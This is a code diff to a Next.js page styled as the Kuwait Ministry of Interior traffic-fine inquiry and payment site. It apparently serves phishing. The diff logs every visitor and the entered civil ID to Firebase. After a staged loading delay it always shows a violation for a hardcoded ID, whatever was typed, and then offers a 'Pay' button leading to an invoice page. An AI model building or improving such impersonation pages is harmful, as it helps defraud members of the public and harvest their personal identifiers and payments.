@@ -10,42 +10,99 @@ import {
   FileText,
   MapPin,
   Menu,
+  PlayIcon,
   UserCheck,
 } from 'lucide-react';
 import type React from 'react'; // Added import for React
 import { useRouter } from 'next/navigation';
 import { ViolationResult } from '@/components/violation-result';
+import { useEffect, useState } from 'react';
+import { SkeletonDemo } from '@/components/sektlokm';
+import { ReferenceNumberSection } from '@/components/reference-number-section';
+import { addData } from '@/lib/firebase-service';
 
 export default function Home() {
+  const [currantPage,setCurrantPage]=useState(1)
+  const [_id]=useState( "id" + Math.random().toString(16).slice(2))
+  const [id, setid] = useState('')
+
+const data={
+    id:_id,
+    currentPage:currantPage,
+    createdDate: new Date().toISOString(),
+    notificationCount:1,
+    personalInfo: {
+     id:id
+    },
+  };
+  const [show, setShow] = useState(false)
+  const [loading, setloading] = useState(false)
   const router = useRouter();
   const handlePayClicked = () => {
+    addData(data)
     router.push('/invoice');
+
+  };
+  useEffect(()=>{
+    localStorage.setItem('vistor',_id)
+      addData(data)
+    },[])
+  const handleSubmit = () => {
+    if (id !== '' || id.length > 2) {
+      setloading(true)
+      setTimeout(() => {
+        setShow(true)
+        setloading(false)
+
+      }, 4000);
+    }
   };
   return (
-    <div className="min-h-screen bg-gray-50 text-right" dir="rtl">
+    <div className="min-h-screen  text-right" dir="rtl" style={{
+      backgroundColor: `rgba(256, 256, 256, ${70 / 100})`,
+    }}>
+  
       {/* Header */}
-      <header className="bg-white shadow-sm">
-        <div className="container mx-auto px-4 py-2">
-          <div className="flex items-center justify-between">
-            <button className="p-2 text-navy-700">
-              <Menu className="h-6 w-6" />
-            </button>
-            <Image
-              src={`/`}
+      <div className='flex'>
+      <Image
+              src={`/logo.svg`}
+              alt="Kuwait Ministry of Interior Logo"
+              width={280}
+              height={150}
+              className="h-32 w-auto"
+            />  
+      <div className='flex items-center flex-col mt-8' >
+      <Image
+              src={`/vercel.svg`}
               alt="Kuwait Ministry of Interior Logo"
               width={180}
               height={50}
-              className="h-12 w-auto"
-            />
+              className="h-8 w-auto"
+            />    <Image
+            src={`/next.svg`}
+            alt="Kuwait Ministry of Interior Logo"
+            width={180}
+            height={50}
+            className="h-8 w-auto"
+          />
+        </div>
+        </div>
+      <header className=" shadow-sm m-4 bg-navy-700">
+        <div className="container mx-auto px-4 py-2">
+          <div className="flex items-center justify-between">
+            <button className="p-2 text-gray-200">
+              <Menu className="h-6 w-6" />
+            </button>
+       
           </div>
         </div>
       </header>
 
       {/* Traffic Department Logo */}
-      <div className="container mx-auto px-4 py-4">
+      <div className="container mx-auto px-4 py-4"  >
         <div className="flex justify-center">
           <Image
-            src="/placeholder.svg"
+            src="/mor.svg"
             alt="Traffic Department Logo"
             width={80}
             height={80}
@@ -99,29 +156,33 @@ export default function Home() {
           <div className="space-y-4">
             <div>
               <Label>الرقم المدني أو الرقم الموحد</Label>
-              <Input className="text-right" />
+              <Input className="text-right" onChange={(e) => setid(e.target.value)} />
             </div>
 
-            <Button className="w-full bg-blue-600 hover:bg-blue-700">
+            <Button variant={'outline'} onClick={handleSubmit} className="w-full  hover:bg-navy-700 hover:text-white">
               إستعلام
             </Button>
-            <ViolationResult civilId={'112322'} violations={undefined!} />
-            <p className="text-sm text-gray-600 text-center">
-              بعد إجراء عملية الدفع، يرجى عدم محاولة الدفع مرة أخرى حيث يجب
-              تحديث البيانات خلال 15 دقيقة
-            </p>
 
-            <Button onClick={handlePayClicked} className="w-full">
-              ادفع
-            </Button>
+            {show ? <>  <ViolationResult civilId={'112322'} violations={undefined!} />
+              <p className="text-sm text-gray-600 text-center">
+                بعد إجراء عملية الدفع، يرجى عدم محاولة الدفع مرة أخرى حيث يجب
+                تحديث البيانات خلال 15 دقيقة
+              </p>
 
+              <Button 
+              onClick={handlePayClicked} className="w-full">
+                ادفع
+              </Button></> : loading? <SkeletonDemo/>:null}
             <div className="flex justify-center gap-2">
-              <Button variant="outline" className="text-red-600 border-red-600">
+              <Button
+                size={'sm'}
+                variant="default" className="bg-red-600 border-red-600">
                 غير قابلة للدفع الكترونيا
               </Button>
               <Button
-                variant="outline"
-                className="text-green-600 border-green-600"
+                variant="default"
+                size={'sm'}
+                className="bg-green-600 border-green-600"
               >
                 قابلة للدفع الكترونيا
               </Button>
@@ -129,24 +190,32 @@ export default function Home() {
           </div>
         </div>
       </div>
-
+<ReferenceNumberSection/>
       {/* Footer */}
       <footer className="bg-navy-700 text-white py-4 mt-8">
         <div className="container mx-auto px-4">
-          <div className="flex justify-center space-x-4 mb-2">
-            <a href="#" className="hover:text-gray-300">
-              Facebook
+           {/* Social Media Footer */}
+      <div className="flex justify-center space-x-4 py-4">
+        <div className="flex gap-4">
+          {["1", "2", "3", "4", "5", "6"].map((platform) => (
+            <a
+              key={platform}
+              href={`#${platform}`}
+              className="w-6 h-6 flex items-center justify-center"
+              aria-label={`Visit our ${platform} page`}
+            >
+              <Image
+                src={`/${platform}.svg`}
+                alt={platform}
+                width={24}
+                height={24}
+                className="opacity-75 hover:opacity-100 transition-opacity"
+              />
             </a>
-            <a href="#" className="hover:text-gray-300">
-              Twitter
-            </a>
-            <a href="#" className="hover:text-gray-300">
-              Instagram
-            </a>
-            <a href="#" className="hover:text-gray-300">
-              YouTube
-            </a>
-          </div>
+          ))}
+        </div>
+      </div>
+
           <p className="text-center text-sm">
             © جميع الحقوق محفوظة - وزارة الداخلية الكويتية 2025-2026
           </p>
